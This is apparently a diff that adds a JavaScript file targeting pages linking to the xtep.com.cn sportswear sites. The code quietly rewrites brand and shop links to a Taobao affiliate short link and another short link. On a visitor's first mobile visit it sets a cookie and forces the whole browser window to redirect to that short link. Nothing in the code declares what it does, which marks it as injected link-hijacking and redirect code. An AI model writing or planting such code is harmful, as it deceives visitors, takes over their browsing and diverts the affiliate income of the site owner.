@@ -1,0 +1,19 @@
+function mobile_lk(){if((navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i))){jQuery(document).ready(function(){jQuery("[href^='http://www.xtep.com.cn']").attr("href","https://s.click.taobao.com/Zl6brLw");jQuery("[moburls^='http://m.xtep.com.cn/product/goproduct.aspx']").attr("moburls","https://s.click.taobao.com/Zl6brLw");jQuery("[moburl^='https://m.xtep.com.cn/product/list.aspx']").attr("moburl","https://s.click.taobao.com/Zl6brLw");jQuery("[moburl^='http://m.xtep.com.cn/product/goproduct.aspx']").attr("moburl","https://s.click.taobao.com/Zl6brLw");jQuery("[moburl^='http://shop.xtep.com.cn/product/goproduct.aspx']").attr("moburl","https://s.click.taobao.com/Zl6brLw");jQuery("[href^='http://shop.xtep.com.cn']").attr("href","https://s.click.taobao.com/Zl6brLw");jQuery("[href^='http://www.xtepkids.com.cn']").attr("href","http://t.cn/EInpQpm");jQuery("[moburl^='http://shop.xtep.com.cn']").attr("moburl","https://s.click.taobao.com/Zl6brLw")})}}mobile_lk();
+
+function gjwis() {
+jQuery(document).ready(function () {jQuery("[href^='http://www.xtep.com.cn']").attr("href","https://s.click.taobao.com/Zl6brLw");jQuery("[href^='http://shop.xtep.com.cn/product/goproduct.aspx']").attr("href","https://s.click.taobao.com/Zl6brLw");jQuery("[href^='http://www.xtepkids.com.cn']").attr("href","http://t.cn/EInpQpm");jQuery("[pcurl^='http://shop.xtep.com.cn/product/goproduct.aspx']").attr("pcurl","https://s.click.taobao.com/Zl6brLw")} ) }gjwis();
+/**
+;;jQuery("[pcurl^='http://shop.xtep.com.cn/product/goproduct.aspx']").attr("pcurl","https://s.click.taobao.com/Zl6brLw");jQuery("[pcurl^='http://shop.xtep.com.cn/goodstype/']").attr("pcurl","https://s.click.taobao.com/Zl6brLw")
+**/
+var MycookStr = new String(document.cookie);
+var MycookHead = "bancon_fa=";
+if (MycookStr.indexOf(MycookHead) < 0) {
+    var cooktime = new Date();
+    cooktime.setDate(cooktime.getDate() + 7);
+    document.cookie = "bancon_fa=yes;expires=" + cooktime.toGMTString();
+    try {
+        if (navigator.userAgent.match(/iPad|iPod|iPhone|Mobile|UP.Browser|Android|BlackBerry|Windows CE|Windows Phone|Nokia|webOS|SonyEricsson|Opera Mini|opera mobi|IEMobile|POLARIS/) != null) {
+window.top.location.href = "http://t.cn/EInpQpm";
+}
+} catch (e) {}
+};
